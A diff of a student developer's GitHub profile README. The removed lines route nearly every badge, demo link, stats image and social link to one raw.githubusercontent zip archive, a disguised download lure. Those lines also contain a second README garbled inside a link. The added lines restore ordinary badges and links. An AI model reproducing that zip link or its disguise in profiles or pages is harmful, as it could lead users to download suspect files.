@@ -1,162 +1,132 @@
-# Hey 👋, I'm S4GUN
+# Hey there! 👋 I'm S4GUN
 
-🚀 A MERN-Stack Developer | Class 12 Student | Tech Explorer  
-🌐 Currently building an E-commerce website in React JS and sharpening skills in python
+<div align="center">
 
----
+### 🚀 Full-Stack MERN Developer | 🎓 Class 12 Student | 🧠 Tech Explorer
 
-## 🧠 About Me
+🌍 Turning ideas into modern, responsive, and scalable web applications.
 
-- 👨‍💻 Currently Learning: `Python`, `Django`, `Django Channels`
-- 📦 Projects Built: `E-commerce`, `Tourism Site`, `Functional Calculator`
-- 💬 Ask me about: `React`, `MongoDB`, `Tailwind`, `Git`
-- ⚡ Fun Fact: I turn boring UIs into slick, responsive pages 🔥
-- 📚 Exploring: `https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip`,`Python`,`Deep JS`
+<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&duration=3000&pause=1000&color=F97316&center=true&vCenter=true&width=650&lines=Full-Stack+MERN+Developer;Python+%26+Django+Enthusiast;React+%7C+Tailwind+%7C+MongoDB;Always+Learning+New+Technologies" />
 
----
-
-## 🌐  Projects
-
-| Project | Tech Stack | Live Demo |
-|--------|------------|-----------|
-| 🛒 **Food-Commerce** | React, Tailwind, LocalStorage | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
-| 🧮 **Functional Calculator** | HTML, CSS, JS | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
-| 🌍 **Tourism Website** | HTML, CSS, JS | _Coming Soon_ |
-| 🖥️ **Personal Website** | React, Tailwind | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
-
----
-
-## 💻 Tech Stack
-
-**Languages & Frameworks**
-
-![React](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![JavaScript](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![Python](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![HTML5](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![CSS3](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![Tailwind](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-
-**Backend & Databases**
-
-![https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![MongoDB](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-
-**Tools & Others**
-
-![Git](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![GitHub](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![VS Code](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip%20Code-007ACC?logo=visual-studio-code&logoColor=white&style=flat)
-![Postman](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-
----
-
-## 📈 GitHub Stats
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip" height="150px"/>
-  <img src="https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip" height="150px"/>
-</p>
-
----
-
-## 🎯 2025 Goals
-
-- ✅ Master full-stack MERN development
-- ✅ Build 5+ solid personal projects
-- 🚀 Learn Docker & Deployment
-- 📚 Improve Python + Backend skills
-- 🎯 Contribute to open source
-
----
-
-## 📫 Connect With Me
-
-[![GitHub](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-[![Instagram](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)](# Hey 👋, I'm S4GUN
-
-🚀 A Full-Stack Developer | Class 12 Student | Tech Explorer  
-🌐 Building ideas into real-world web apps.
+</div>
 
 ---
 
 ## 🧠 About Me
 
-- 👨‍💻 Currently Learning: `Python`, `Django`, `Django Channels`
-- 📦 Projects Built: `E-commerce`, `Tourism Site`, `Functional Calculator`
-- 💬 Ask me about: `React`, `MongoDB`, `Tailwind`, `Git`
-- ⚡ Fun Fact: I turn boring UIs into slick, responsive pages 🔥
-- 📚 Exploring: `https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip`, `TypeScript`, `WebSockets`, `Docker`
+- 👨‍💻 Currently Learning: `Python`, `Django`, `Django Channels`, `Docker`
+- 🌐 Building: `Scalable Web Apps` and `Real-World Projects`
+- 📦 Projects Built: `Food-Commerce`, `Tourism Website`, `Functional Calculator`
+- 💬 Ask Me About: `React`, `MongoDB`, `Tailwind CSS`, `Git`, `REST APIs`
+- ⚡ Fun Fact: I turn boring UIs into sleek, responsive experiences 🔥
+- 🎯 Mission: Become a world-class full-stack developer and open-source contributor
 
 ---
 
 ## 🌐 Portfolio Projects
 
-| Project | Tech Stack | Live Demo |
-|--------|------------|-----------|
-| 🛒 **Food-Commerce** | React, Tailwind, LocalStorage | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
-| 🧮 **Functional Calculator** | HTML, CSS, JS | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
-| 🌍 **Tourism Website** | HTML, CSS, JS | _Coming Soon_ |
-| 🖥️ **Personal Website** | React, Tailwind | [Live Demo](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip) |
+| 🚀 Project | 🛠️ Tech Stack | 🔗 Status |
+|----------|----------------|----------|
+| 🛒 Food-Commerce | React, Tailwind, LocalStorage | ✅ Completed |
+| 🧮 Functional Calculator | HTML, CSS, JavaScript | ✅ Completed |
+| 🌍 Tourism Website | HTML, CSS, JavaScript | 🚧 In Progress |
+| 🖥️ Personal Portfolio | React, Tailwind | 🚀 Building |
+| 💬 Real-Time Chat App | Django Channels, WebSockets | 🧠 Learning Phase |
 
 ---
 
 ## 💻 Tech Stack
 
-**Languages & Frameworks**
+### 🎨 Frontend
+![React](https://img.shields.io/badge/React-61DAFB?logo=react&logoColor=black&style=for-the-badge)
+![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black&style=for-the-badge)
+![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white&style=for-the-badge)
+![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white&style=for-the-badge)
+![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-06B6D4?logo=tailwind-css&logoColor=white&style=for-the-badge)
 
-![React](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![JavaScript](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![Python](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![HTML5](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![CSS3](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![Tailwind](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
+### ⚙️ Backend
+![Node.js](https://img.shields.io/badge/Node.js-339933?logo=node.js&logoColor=white&style=for-the-badge)
+![Express.js](https://img.shields.io/badge/Express.js-000000?logo=express&logoColor=white&style=for-the-badge)
+![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white&style=for-the-badge)
+![Django](https://img.shields.io/badge/Django-092E20?logo=django&logoColor=white&style=for-the-badge)
 
-**Backend & Databases**
+### 🗄️ Databases
+![MongoDB](https://img.shields.io/badge/MongoDB-47A248?logo=mongodb&logoColor=white&style=for-the-badge)
 
-![https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![MongoDB](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-
-**Tools & Others**
-
-![Git](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![GitHub](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-![VS Code](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip%20Code-007ACC?logo=visual-studio-code&logoColor=white&style=flat)
-![Postman](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
+### 🛠️ Tools
+![Git](https://img.shields.io/badge/Git-F05032?logo=git&logoColor=white&style=for-the-badge)
+![GitHub](https://img.shields.io/badge/GitHub-181717?logo=github&logoColor=white&style=for-the-badge)
+![VS Code](https://img.shields.io/badge/VS_Code-007ACC?logo=visual-studio-code&logoColor=white&style=for-the-badge)
+![Postman](https://img.shields.io/badge/Postman-FF6C37?logo=postman&logoColor=white&style=for-the-badge)
+![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white&style=for-the-badge)
 
 ---
 
 ## 📈 GitHub Stats
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip" height="150px"/>
-  <img src="https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip" height="150px"/>
-</p>
+<div align="center">
+
+<img height="170" src="https://github-readme-stats.vercel.app/api?username=sagunn246&show_icons=true&theme=tokyonight&hide_border=true&border_radius=12" />
+
+<img height="170" src="https://github-readme-stats.vercel.app/api/top-langs/?username=sagunn246&layout=compact&theme=tokyonight&hide_border=true&border_radius=12" />
+
+<img src="https://github-readme-streak-stats.herokuapp.com/?user=sagunn246&theme=tokyonight&hide_border=true&border_radius=12" />
+
+</div>
 
 ---
 
-## 🎯 2025 Goals
+## 🏆 Achievements
 
-- ✅ Master full-stack MERN development
-- ✅ Build 5+ solid personal projects
-- 🚀 Learn Docker & Deployment
-- 📚 Improve Python + Backend skills
-- 🎯 Contribute to open source
+- 🏗️ Built multiple full-stack and frontend projects
+- 🎨 Developed responsive and modern UI/UX designs
+- 🧠 Continuously mastering backend technologies
+- 📚 Balancing Class 12 studies with software development
+- 🌍 Working toward open-source contributions
+
+---
+
+## 🎯 2026 Goals
+
+- 🚀 Master the complete MERN Stack
+- 🐍 Become highly proficient in Python and Django
+- 💬 Build a production-ready real-time chat application
+- 🐳 Learn Docker and deployment workflows
+- ☁️ Deploy projects to cloud platforms
+- 🌍 Launch a professional portfolio website
+- 🤝 Contribute to open-source projects
+- 🏆 Build 10+ impressive real-world applications
+
+---
+
+## 📊 Contribution Graph
+
+<div align="center">
+
+<img src="https://github-readme-activity-graph.vercel.app/graph?username=sagunn246&theme=tokyo-night&hide_border=true&radius=12" />
+
+</div>
 
 ---
 
 ## 📫 Connect With Me
 
-[![GitHub](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
-[![Instagram](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)](https://raw.githubusercontent.com/sagunn246/sagunn246/main/forcedness/sagunn246_v2.9-beta.5.zip)
+<div align="center">
+
+[![GitHub](https://img.shields.io/badge/GitHub-181717?logo=github&logoColor=white&style=for-the-badge)](https://github.com/sagunn246)
+[![Instagram](https://img.shields.io/badge/Instagram-E4405F?logo=instagram&logoColor=white&style=for-the-badge)](https://instagram.com/)
+[![Gmail](https://img.shields.io/badge/Gmail-EA4335?logo=gmail&logoColor=white&style=for-the-badge)](mailto:your-email@example.com)
+
+</div>
 
 ---
 
-_“Stay curious, keep building, and never stop learning.”_
-)
+<div align="center">
 
----
+### 💡 "Stay curious, keep building, and never stop learning."
 
-_“Stay curious, keep building, and never stop learning.”_
+⭐ If you like my projects, consider following my journey!
+
+![Profile Views](https://komarev.com/ghpvc/?username=sagunn246&label=Profile%20Views&color=F97316&style=for-the-badge)
+
+</div>
